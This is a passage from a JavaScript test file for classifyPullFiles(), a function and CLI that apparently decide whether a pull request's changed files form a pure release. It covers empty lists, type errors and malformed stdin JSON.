    assert.equal(entry.reason, 'invalid-filename');
    assert.notEqual(entry.reason, 'undefined');
  }
});

test('classifyPullFiles(): a multi-package pure list (added + modified) stays pure', async () => {
  const files = [
    { filename: 'packages/understanding-gate/package.json', status: 'modified' },
    { filename: 'package-lock.json', status: 'modified' },
    { filename: 'packages/a/CHANGELOG.md', status: 'modified' },
    { filename: 'packages/b/CHANGELOG.md', status: 'added' },
  ];
  const readFile = fakeReaderFrom(PR_190_CONTENT);
  const verdict = await classifyPullFiles(files, {
    readFile,
    baseRef: PR_190_BASE_REF,
    headRef: PR_190_HEAD_REF,
  });
  assert.equal(verdict.pure_release, true);
  assert.equal(verdict.rejected.length, 0);
});

test('classifyPullFiles(): empty file list is NOT pure', async () => {
  const verdict = await classifyPullFiles([], {
    readFile: async () => null,
    baseRef: 'base',
    headRef: 'head',
  });
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.reason, 'empty-file-list');
});

test('classifyPullFiles(): throws TypeError on a non-array input (caller bug, not a verdict)', async () => {
  const opts = { readFile: async () => null, baseRef: 'base', headRef: 'head' };
  await assert.rejects(() => classifyPullFiles('package.json', opts), TypeError);
  await assert.rejects(() => classifyPullFiles(null, opts), TypeError);
});

test('classifyPullFiles(): throws TypeError when readFile is not a function', async () => {
  await assert.rejects(
    () => classifyPullFiles([{ filename: 'CHANGELOG.md', status: 'modified' }], {}),
    TypeError,
  );
});

// ── CLI ────────────────────────────────────────────────────────────────

test('CLI: argv file list, pure release, exit 0', () => {
  const out = execFileSync(process.execPath, [SCRIPT_PATH, ...PR_190_FILES], {
    encoding: 'utf8',
  });
  const verdict = JSON.parse(out.trim());
  assert.equal(verdict.pure_release, true);
});

test('CLI: stdin JSON array, not pure, exit 0 (verdict, not a failure)', () => {
  const out = execFileSync(process.execPath, [SCRIPT_PATH], {
    input: JSON.stringify(PR_215_FILES),
    encoding: 'utf8',
  });
  const verdict = JSON.parse(out.trim());
  assert.equal(verdict.pure_release, false);
});

test('CLI: empty stdin (no argv, no piped data) is the empty list, exit 0', () => {
  const out = execFileSync(process.execPath, [SCRIPT_PATH], {
    input: '',
    encoding: 'utf8',
  });
  const verdict = JSON.parse(out.trim());
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.allowed, []);
  assert.deepEqual(verdict.rejected, []);
});

test('CLI: malformed JSON on stdin exits non-zero', () => {
  assert.throws(() => {
    execFileSync(process.execPath, [SCRIPT_PATH], {
      input: '{not valid json',
      encoding: 'utf8',
    });
  }, /Command failed/);
});

test('CLI: valid JSON on stdin that is not an array of strings exits non-zero', () => {
  assert.throws(() => {
    execFileSync(process.execPath, [SCRIPT_PATH], {
      input: JSON.stringify({ not: 'an array' }),
      encoding: 'utf8',
    });
  }, /Command failed/);
});
